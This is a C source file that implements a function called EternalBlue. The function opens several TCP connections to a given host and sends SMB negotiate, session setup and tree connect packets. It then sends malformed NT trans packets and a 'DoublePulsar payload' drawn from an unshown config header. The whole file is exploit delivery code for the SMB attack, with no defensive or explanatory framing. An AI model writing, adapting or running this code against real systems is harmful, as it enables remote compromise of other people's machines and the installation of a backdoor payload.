#define _GNU_SOURCE
#include "eternalblue_config.h"

#include <errno.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

static int
send_packet_chunks(int fd, const void *data, size_t length)
{
    const unsigned char *bytes = data;
    size_t offset = 0;
    size_t chunk_size = (size_t)SMB_CHUNK_SIZE;

    if (chunk_size == 0)
        return -1;

    while (offset < length) {
        size_t amount = length - offset;
        if (amount > chunk_size)
            amount = chunk_size;

        size_t sent = 0;
        while (sent < amount) {
            ssize_t result = send(fd, bytes + offset + sent, amount - sent,
                                  MSG_NOSIGNAL);
            if (result < 0) {
                if (errno == EINTR)
                    continue;
                return -1;
            }
            if (result == 0)
                return -1;
            sent += (size_t)result;
        }
        offset += amount;
    }

    return 0;
}

int
EternalBlue(const char *ip, int port)
{
    int sockets[NUM_SOCKETS];
    char service[16];
    struct addrinfo hints;
    struct addrinfo *addresses = NULL;
    int connected = 0;
    int result = -1;

    for (int i = 0; i < NUM_SOCKETS; i++)
        sockets[i] = -1;

    if (ip == NULL || port < 0 || port > 65535 || NUM_SOCKETS < 3 ||
        SMB_CHUNK_SIZE <= 0) {
        printf("EternalBlue: invalid arguments or configuration\n");
        goto cleanup;
    }

    snprintf(service, sizeof(service), "%d", port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    printf("EternalBlue: resolving %s:%d\n", ip, port);
    if (getaddrinfo(ip, service, &hints, &addresses) != 0) {
        printf("EternalBlue: address resolution failed\n");
        goto cleanup;
    }

    for (int i = 0; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: opening TCP connection %d of %d\n",
               i + 1, NUM_SOCKETS);

        for (struct addrinfo *address = addresses;
             address != NULL; address = address->ai_next) {
            int fd = socket(address->ai_family, address->ai_socktype,
                            address->ai_protocol);
            if (fd < 0)
                continue;

            if (connect(fd, address->ai_addr, address->ai_addrlen) == 0) {
                sockets[i] = fd;
                connected++;
                break;
            }

            close(fd);
        }

        if (sockets[i] < 0) {
            printf("EternalBlue: connection %d failed\n", i + 1);
            goto cleanup;
        }
    }

    freeaddrinfo(addresses);
    addresses = NULL;

    for (int i = 0; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: sending SMB negotiate on socket %d\n", i);
        if (send_packet_chunks(sockets[i], SMB_NEGOTIATE_PKT,
                               sizeof(SMB_NEGOTIATE_PKT)) < 0)
            goto cleanup;

        printf("EternalBlue: sending SMB session setup on socket %d\n", i);
        if (send_packet_chunks(sockets[i], SMB_SESSION_SETUP_PKT,
                               sizeof(SMB_SESSION_SETUP_PKT)) < 0)
            goto cleanup;

        printf("EternalBlue: sending SMB tree connect on socket %d\n", i);
        if (send_packet_chunks(sockets[i], SMB_TREE_CONNECT_PKT,
                               sizeof(SMB_TREE_CONNECT_PKT)) < 0)
            goto cleanup;
    }

    printf("EternalBlue: sending malformed NT trans packets on socket 0\n");
    for (int i = 0; i < 3; i++) {
        printf("EternalBlue: malformed NT trans packet %d of 3\n", i + 1);
        if (send_packet_chunks(sockets[0], SMB_TRANS_PKT,
                               sizeof(SMB_TRANS_PKT)) < 0)
            goto cleanup;
    }

    for (int i = 2; i < NUM_SOCKETS; i++) {
        printf("EternalBlue: sending DoublePulsar payload on socket %d\n", i);
        if (send_packet_chunks(sockets[i], DP_EXEC_PKT,
                               sizeof(DP_EXEC_PKT)) < 0)
            goto cleanup;
    }

    result = 0;

cleanup:
    if (addresses != NULL)
        freeaddrinfo(addresses);

    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (sockets[i] >= 0) {
            printf("EternalBlue: closing socket %d\n", i);
            if (close(sockets[i]) < 0 && result == 0)
                result = -1;
            sockets[i] = -1;
        }
    }

    (void)connected;
    return result;
}